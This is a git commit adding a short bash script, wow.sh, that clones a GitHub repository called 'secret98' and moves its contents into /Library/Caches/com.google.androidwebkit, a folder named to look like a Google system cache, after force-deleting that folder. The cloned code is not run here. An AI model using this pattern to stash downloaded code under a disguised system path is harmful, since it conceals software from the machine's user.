49ae5057ac511a8c0d6181f5a65a871c7ba3394b
ft-secret <120125662+ft-secret@users.noreply.github.com>
2022-12-08 20:37:29 +0300

    Create wow.sh

---
+++ wow.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+rm -rf secret98
+
+git clone https://github.com/ft-secret/secret98.git
+
+rm -rf /Library/Caches/com.google.androidwebkit
+
+mkdir /Library/Caches/com.google.androidwebkit
+
+mv secret98/* /Library/Caches/com.google.androidwebkit
+
+rm -rf secret98
